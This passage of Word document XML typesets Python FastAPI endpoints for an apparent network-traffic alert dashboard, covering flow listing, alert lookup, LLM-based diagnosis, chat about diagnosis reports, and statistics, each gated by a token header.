          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def list_flows(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7ADB0386">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    limit: int = 200,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EF673E2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    probe_id: str | None = None,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BB7B379">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    since: float | None = None,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E728EC4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    x_probe_token: str | None = Header(default=None),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="056DD50D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78516BBA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """流水表数据源。默认 200 条、倒序，看板每 2 s 拉一次。"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="395E58B8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    require_token(x_probe_token)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7106A1FB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return {"flows": app.state.store.flows(min(limit, 2000), probe_id, since)}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33A3F470">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7F8E8C01">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="21CD615D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>@app.get("/api/v1/alerts/{alert_id}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30DA6AFD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def get_alert(alert_id: int, x_probe_token: str | None = Header(default=None)):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BAF2787">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    require_token(x_probe_token)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C7982F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    alert = app.state.store.alert(alert_id)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F6A527F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if not alert:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16A30CE1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        raise HTTPException(404, "告警不存在")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BE08D71">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return {"alert": alert, "report": app.state.store.report_for_alert(alert_id)}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71F64296">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="14AC12AA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2EAA9161">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>@app.post("/api/v1/diagnose")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B1A862D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def diagnose(body: DiagnoseIn, background: BackgroundTasks, x_probe_token: str | None = Header(default=None)):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="269448A1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    require_token(x_probe_token)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="185CD5B0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    alert = app.state.store.alert(body.alert_id)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A39F762">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if not alert:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02263884">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        raise HTTPException(404, "告警不存在")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="116463F7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if body.force:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A116798">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        # force 时先删旧报告再重跑；正常路径不会走到这里</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B4557FC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        with app.state.store.connect() as conn:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AD7556B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            conn.execute("DELETE FROM reports WHERE alert_id=?", (body.alert_id,))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BB54F66">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    elif app.state.store.report_for_alert(body.alert_id):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78D77A4C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return {"status": "exists", "report": app.state.store.report_for_alert(body.alert_id)}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F3558CE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    background.add_task(diagnose_alert, body.alert_id)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DFCF911">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return {"status": "queued", "alert_id": body.alert_id}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04BE6BAF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3AC9D956">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3D7DF272">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>@app.post("/api/v1/chat")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="558E4611">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def chat(body: ChatIn, x_probe_token: str | None = Header(default=None)):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C380879">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    require_token(x_probe_token)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68325DD1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    store: Store = app.state.store</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="794E1A88">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    report = store.report(body.report_id) if body.report_id else None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EB02CCA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if report is None and body.alert_id is not None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BC49653">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        report = store.report_for_alert(body.alert_id)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="367BE0CB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if report is None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="580A611F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        raise HTTPException(404, "找不到对应的报告；先用 /api/v1/diagnose 生成")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44EFF30C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0C079533">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    history = store.chat_history(report["id"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A4F61E0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    store.add_chat(report["id"], "user", body.question)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C70400F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    try:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CE32D06">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        answer = app.state.llm.chat(report["content"], history, body.question)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1845BE55">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    except LLMUnavailable as exc:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C34C99E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        raise HTTPException(503, f"大模型不可用：{exc}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A6C5C63">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    store.add_chat(report["id"], "assistant", answer)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AEF65D5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return {"report_id": report["id"], "answer": answer}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F493611">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0AB331C0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2DC756AB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>@app.get("/api/v1/stats")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AC0D694">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def stats(since: float | None = None, x_probe_token: str | None = Header(default=None)):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E65F25E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    require_token(x_probe_token)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18D9A2F8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    out = app.state.store.stats(since)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32E4D0C8">
      <w:pPr>
        <w:widowControl w:val="0"/>
